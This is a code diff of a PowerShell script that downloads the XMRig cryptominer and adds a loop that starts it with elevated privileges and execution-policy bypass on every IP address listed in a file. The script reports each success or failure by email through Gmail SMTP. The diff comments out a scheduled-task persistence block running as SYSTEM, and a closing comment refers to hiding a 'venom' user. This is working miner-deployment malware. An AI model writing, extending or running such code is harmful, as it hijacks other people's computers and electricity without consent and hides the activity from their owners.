@@ -119,7 +119,7 @@ Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2
 Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$currentDirectory"
 
 # Verify extraction
-#Get-ChildItem -Path $currentDirectory
+Get-ChildItem -Path $currentDirectory
 
 #replace config.json
 $newConfigPath = "$path\config.json"
@@ -133,24 +133,97 @@ if (Test-Path -Path $newConfigPath) {
 }
 
 # Define the path to the CMD file
-$CMDFilePath = "currentDirectory\start.cmd"
+#$CMDFilePath = "currentDirectory\start.cmd"
 
 # Define the task name
-$TaskName = "windows host start"
+#$TaskName = "windows host start"
 
 # Create the scheduled task action
-$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$CMDFilePath`""
+#$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$CMDFilePath`""
 
 # Create the scheduled task trigger for startup
-$Trigger = New-ScheduledTaskTrigger -AtStartup
+#$Trigger = New-ScheduledTaskTrigger -AtStartup
 
 # Create the scheduled task settings
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartIfOnBatteries
+#$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartIfOnBatteries
 
 # Register the scheduled task
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM"
+#Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM"
 
-Write-Host "Scheduled task created successfully. Your CMD file will now run at startup."
+#Write-Host "Scheduled task created successfully. Your CMD file will now run at startup."
+
+
+# Define the path to the text file with IP addresses
+$ipFile = "$path\Ips.txt"
+
+# Define the path to XMRig executable
+$xmrPath = "$currentDirectory\xmrig.exe"
+
+# Define the configuration file path
+$configPath = "$currentDirectory\config.json"
+
+# Send the email with Rig Status
+Send-MailMessage `
+    -From $email `
+    -To $email `
+    -Subject "XMRig Execution Status from $env:UserName" `
+    -Body "Xmrig Process Starting..." `
+    -SmtpServer "smtp.gmail.com" `
+    -Port 587 `
+    -UseSsl `
+    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))
+
+# Read the IP addresses from the text file
+$ips = Get-Content -Path $ipFile
+
+foreach ($ip in $ips) {
+    try {
+        Write-Output "Processing IP: $ip"
+        
+        # Command to start XMRig with the configuration file
+        $command = "$xmrPath -c $configPath"
+
+        # Execute the command on the remote computer with elevated privileges
+        Invoke-Command -ComputerName $ip -ScriptBlock {
+            param($command)
+            Start-Process -FilePath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
+        } -ArgumentList $command
+
+        Write-Output "XMRig started on IP: $ip"
+        Send-MailMessage `
+            -From $email `
+            -To $email `
+            -Subject "XMRig Execution Success" `
+            -Body "XMRig has successfully started on IP: $ip" `
+            -SmtpServer "smtp.gmail.com" `
+            -Port 587 `
+            -UseSsl `
+            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))
+    } catch {
+        Write-Output "Error processing IP: $ip"
+        Send-MailMessage `
+            -From $email `
+            -To $email `
+            -Subject "XMRig Execution Failure" `
+            -Body "Failed to start XMRig on IP: $ip" `
+            -SmtpServer "smtp.gmail.com" `
+            -Port 587 `
+            -UseSsl `
+            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))
+    }
+}
+
+Write-Output "Script execution completed"
+Send-MailMessage `
+    -From $email `
+    -To $email `
+    -Subject "Script Execution Completed" `
+    -Body "The script has finished executing. Please check the status of each IP address." `
+    -SmtpServer "smtp.gmail.com" `
+    -Port 587 `
+    -UseSsl `
+    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))
+
 
 
 # hide venom user
